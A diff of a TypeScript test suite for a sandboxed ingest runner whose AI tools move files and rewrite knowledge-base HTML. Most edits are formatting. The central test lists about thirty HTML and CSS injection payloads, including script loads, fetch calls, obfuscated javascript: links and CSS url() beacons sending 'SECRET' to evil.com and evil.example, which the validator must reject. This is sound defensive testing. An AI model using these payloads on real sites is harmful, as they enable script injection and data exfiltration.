@@ -1,5 +1,5 @@
 import assert from "node:assert/strict";
-import { existsSync, mkdirSync, readFileSync, rmSync, writeFileSync } from "node:fs";
+import { mkdirSync, readFileSync, rmSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
 import { afterEach, describe, test } from "node:test";
@@ -140,7 +140,15 @@ describe("Step 5: 受限可写 Ingest Runner 与安全工具围栏 (tools.ts + r
 
     // 4. 尝试移入未授权分类目录 (00_待归档/) -> 拒绝
     assert.equal(
-      executeIngestMoveFile(wsPath, config, batchId, stagedFile.relPath, "00_待归档/202611_洋钱罐风险预估.xlsx", allowedSet, log).ok,
+      executeIngestMoveFile(
+        wsPath,
+        config,
+        batchId,
+        stagedFile.relPath,
+        "00_待归档/202611_洋钱罐风险预估.xlsx",
+        allowedSet,
+        log,
+      ).ok,
       false,
     );
 
@@ -170,37 +178,37 @@ describe("Step 5: 受限可写 Ingest Runner 与安全工具围栏 (tools.ts + r
     const { wsPath, config } = makeRunnerTestEnv();
 
     const dangerousPayloads = [
-      "<!DOCTYPE html><html><script src=\"https://evil.com/x.js\"></script><body></body></html>",
+      '<!DOCTYPE html><html><script src="https://evil.com/x.js"></script><body></body></html>',
       "<!DOCTYPE html><html><body><script>fetch('https://evil.com')</script></body></html>",
       "<!DOCTYPE html><html><body><script type=\"module\">import('https://evil.com/x.js')</script></body></html>",
       "<!DOCTYPE html><html><body><img src=x onerror=\"fetch('https://evil.com')\"></body></html>",
-      "<!DOCTYPE html><html><body><a href=\"javascript&#58;alert(1)\">x</a></body></html>",
-      "<!DOCTYPE html><html><body><a href=\"java&#x73;cript:alert(1)\">x</a></body></html>",
-      "<!DOCTYPE html><html><body><a href=\"java\nscript:alert(1)\">x</a></body></html>",
-      "<!DOCTYPE html><html><body><button formaction=\"javascript:alert(1)\">x</button></body></html>",
-      "<!DOCTYPE html><html><head><meta http-equiv=\"&#114;efresh\" content=\"0;url=https://evil.com\"></head><body></body></html>",
-      "<!DOCTYPE html><html><body><img src=\"https://evil.com/a.png?d=SECRET\"></body></html>",
-      "<!DOCTYPE html><html><body><iframe src=\"https://evil.com\"></iframe></body></html>",
-      "<!DOCTYPE html><html><head><style>@import \"https://evil.example/a.css\";</style></head><body></body></html>",
+      '<!DOCTYPE html><html><body><a href="javascript&#58;alert(1)">x</a></body></html>',
+      '<!DOCTYPE html><html><body><a href="java&#x73;cript:alert(1)">x</a></body></html>',
+      '<!DOCTYPE html><html><body><a href="java\nscript:alert(1)">x</a></body></html>',
+      '<!DOCTYPE html><html><body><button formaction="javascript:alert(1)">x</button></body></html>',
+      '<!DOCTYPE html><html><head><meta http-equiv="&#114;efresh" content="0;url=https://evil.com"></head><body></body></html>',
+      '<!DOCTYPE html><html><body><img src="https://evil.com/a.png?d=SECRET"></body></html>',
+      '<!DOCTYPE html><html><body><iframe src="https://evil.com"></iframe></body></html>',
+      '<!DOCTYPE html><html><head><style>@import "https://evil.example/a.css";</style></head><body></body></html>',
       "<!DOCTYPE html><html><head><style>@import '//evil.example/a.css';</style></head><body></body></html>",
-      "<!DOCTYPE html><html><body style=\"background:url(&quot;https://evil.example/a.png&quot;)\"></body></html>",
-      "<!DOCTYPE html><html><body style=\"background:url(&apos;https://evil.example/a.png&apos;)\"></body></html>",
-      "<!DOCTYPE html><html><body style=\"background:url(\\68 ttps://evil.example/a.png)\"></body></html>",
-      "<!DOCTYPE html><html><body><a href=\"data:application/xhtml+xml,%3Cscript%3Ealert(1)%3C/script%3E\">x</a></body></html>",
-      "<!DOCTYPE html><html><body><img srcset=\"data:image/png;base64,AA 1x, https://evil.example/x.png 2x\"></body></html>",
+      '<!DOCTYPE html><html><body style="background:url(&quot;https://evil.example/a.png&quot;)"></body></html>',
+      '<!DOCTYPE html><html><body style="background:url(&apos;https://evil.example/a.png&apos;)"></body></html>',
+      '<!DOCTYPE html><html><body style="background:url(\\68 ttps://evil.example/a.png)"></body></html>',
+      '<!DOCTYPE html><html><body><a href="data:application/xhtml+xml,%3Cscript%3Ealert(1)%3C/script%3E">x</a></body></html>',
+      '<!DOCTYPE html><html><body><img srcset="data:image/png;base64,AA 1x, https://evil.example/x.png 2x"></body></html>',
       "<!DOCTYPE html><html><body style=\"background-image:image-set('https://evil.example/a.png' 1x)\"></body></html>",
       "<!DOCTYPE html><html><body style=\"background-image:-webkit-image-set('https://evil.example/a.png' 1x)\"></body></html>",
       "<!DOCTYPE html><html><body style=\"background-image:image('https://evil.example/a.png')\"></body></html>",
       "<!DOCTYPE html><html><body><div title=\">\" style=\"background-image:image-set(')' 99x, 'https://evil.example/a.png' 1x)\"></div></body></html>",
-      "<!DOCTYPE html><html><body><img src=\"https&colon&sol&sol;evil.example/a.png?d=SECRET\"></body></html>",
-      "<!DOCTYPE html><html><body><svg><image href=\"data:image/gif;base64,AAAA\"><set attributeName=\"href\" to=\"https://evil.example/a.png\"/></image></svg></body></html>",
+      '<!DOCTYPE html><html><body><img src="https&colon&sol&sol;evil.example/a.png?d=SECRET"></body></html>',
+      '<!DOCTYPE html><html><body><svg><image href="data:image/gif;base64,AAAA"><set attributeName="href" to="https://evil.example/a.png"/></image></svg></body></html>',
       `<!DOCTYPE html><html><head><style>body{background:image-set(/*${"a".repeat(5000)}*/"https://evil.example/a.png" 1x)}</style ></head><body></body></html>`,
-      "<!DOCTYPE html><html><head><style>.a{content:\"/*\"}body{background:url(\"https://evil.example/a.png\")}.b{content:\"*/\"}</style></head><body></body></html>",
+      '<!DOCTYPE html><html><head><style>.a{content:"/*"}body{background:url("https://evil.example/a.png")}.b{content:"*/"}</style></head><body></body></html>',
       "<!DOCTYPE html><html><body><div style=\".a{content:'/*'}body{background:url('https://evil.example/a.png')}.b{content:'*/'}\"></div></body></html>",
-      "<!DOCTYPE html><html><head><style>.x{a:</ style>}body{background:url(\"https://evil.example/a.png\")}< style></style></head><body></body></html>",
-      "<!DOCTYPE html><html><head><style>.x{a:</style=foo>}body{background:url(\"https://evil.example/a.png\")}<style></style></head><body></body></html>",
-      "<!DOCTYPE html><html><head><style title=\"></style>\">body{background:url(\"https://evil.example/a.png\")}</head><body></body></html>",
-      "<!DOCTYPE html><html><head><style>body{background:url(\"ht\\\ntps:\\\n/\\\n/evil.example/a.png\")}</style></head><body></body></html>",
+      '<!DOCTYPE html><html><head><style>.x{a:</ style>}body{background:url("https://evil.example/a.png")}< style></style></head><body></body></html>',
+      '<!DOCTYPE html><html><head><style>.x{a:</style=foo>}body{background:url("https://evil.example/a.png")}<style></style></head><body></body></html>',
+      '<!DOCTYPE html><html><head><style title="></style>">body{background:url("https://evil.example/a.png")}</head><body></body></html>',
+      '<!DOCTYPE html><html><head><style>body{background:url("ht\\\ntps:\\\n/\\\n/evil.example/a.png")}</style></head><body></body></html>',
     ];
 
     for (const payload of dangerousPayloads) {
@@ -214,7 +222,8 @@ describe("Step 5: 受限可写 Ingest Runner 与安全工具围栏 (tools.ts + r
       false,
     );
     assert.equal(
-      executeIngestUpdateHtml(wsPath, config, "资产/随便写的名字.html", "<!DOCTYPE html><html><body>hack</body></html>").ok,
+      executeIngestUpdateHtml(wsPath, config, "资产/随便写的名字.html", "<!DOCTYPE html><html><body>hack</body></html>")
+        .ok,
       false,
     );
 
@@ -233,12 +242,14 @@ describe("Step 5: 受限可写 Ingest Runner 与安全工具围栏 (tools.ts + r
     assert.equal(updatedContent.includes("更新后的资产看板"), true);
     // 验证正文文本中同时包含 image() 说明与参考网址不会被误杀
     assert.equal(
-      validateKbHtmlContentSafety("<!DOCTYPE html><html><head><style>body{margin:0}</style></head><body><p>调用 url() 或 image() 绘制。文档见 https://example.com/docs</p></body></html>").ok,
+      validateKbHtmlContentSafety(
+        "<!DOCTYPE html><html><head><style>body{margin:0}</style></head><body><p>调用 url() 或 image() 绘制。文档见 https://example.com/docs</p></body></html>",
+      ).ok,
       true,
     );
   });
 
-  test("runIngestBatchJob 完整调度：正确读取 result.result、闭合 runRecord、强制沙箱，且超时后锁死写工具防止残留并发写盘", async () => {
+  test("runIngestBatchJob 完整调度：正确读取 result.result、闭合 runRecord、按租户遵循沙箱配置（默认启用），且超时后锁死写工具防止残留并发写盘", async () => {
     const { wsPath, host, meta, stagedFile } = makeRunnerTestEnv();
 
     let capturedTools: string[] = [];
@@ -248,7 +259,6 @@ describe("Step 5: 受限可写 Ingest Runner 与安全工具围栏 (tools.ts + r
     bindIngestRunner({
       apiKey: () => "test-api-key",
       listModels: async () => [BACKGROUND_MODEL],
-      sandbox: () => false, // 即使宿主传 false，Runner 也应强制启用沙箱
       prompt: async (_message, options) => {
         capturedTools = [...(options.tools ?? [])];
         capturedSandbox = options.local?.sandboxOptions?.enabled;
@@ -264,7 +274,7 @@ describe("Step 5: 受限可写 Ingest Runner 与安全工具围栏 (tools.ts + r
           },
           { toolCallId: "c2" },
         );
-        assert.equal(typeof moveRes === "string" && moveRes.includes("\"ok\":true"), true);
+        assert.equal(typeof moveRes === "string" && moveRes.includes('"ok":true'), true);
 
         const htmlRes = await custom.ingest_update_html.execute(
           {
@@ -273,7 +283,7 @@ describe("Step 5: 受限可写 Ingest Runner 与安全工具围栏 (tools.ts + r
           },
           { toolCallId: "c3" },
         );
-        assert.equal(typeof htmlRes === "string" && htmlRes.includes("\"ok\":true"), true);
+        assert.equal(typeof htmlRes === "string" && htmlRes.includes('"ok":true'), true);
 
         return {
           id: "run_1",
@@ -319,12 +329,17 @@ describe("Step 5: 受限可写 Ingest Runner 与安全工具围栏 (tools.ts + r
     assert.equal(readFileSync(join(wsPath, ".jiebo", "memory.md"), "utf8"), "# 工作区记忆\n原始记忆内容\n");
 
     // 验证超时后 customTools 被立即锁死，迟到的工具调用返回 isError: true
-    let lateToolRef: any = null;
+    let lateToolRef: {
+      execute: (
+        args: Record<string, unknown>,
+        ctx: { toolCallId: string },
+      ) => Promise<string | { content: string; isError?: boolean }>;
+    } | null = null;
     bindIngestRunner({
       apiKey: () => "test-api-key",
       listModels: async () => [BACKGROUND_MODEL],
       prompt: async (_m, options) => {
-        lateToolRef = options.local?.customTools?.ingest_update_html;
+        lateToolRef = (options.local?.customTools?.ingest_update_html ?? null) as typeof lateToolRef;
         await new Promise((r) => setTimeout(r, 120));
         return { id: "run_2", status: "finished", result: "late", messages: [] };
       },
@@ -352,7 +367,7 @@ describe("Step 5: 受限可写 Ingest Runner 与安全工具围栏 (tools.ts + r
     assert.equal(timeoutRes.status, "failed");
     assert.equal(runningCount(host), 0);
     assert.equal(Boolean(lateToolRef), true);
-    const lateCallOut = await lateToolRef.execute(
+    const lateCallOut = await lateToolRef!.execute(
       {
         htmlRelPath: "资产/资产.html",
         htmlContent: "<!DOCTYPE html><html><body>late write</body></html>",
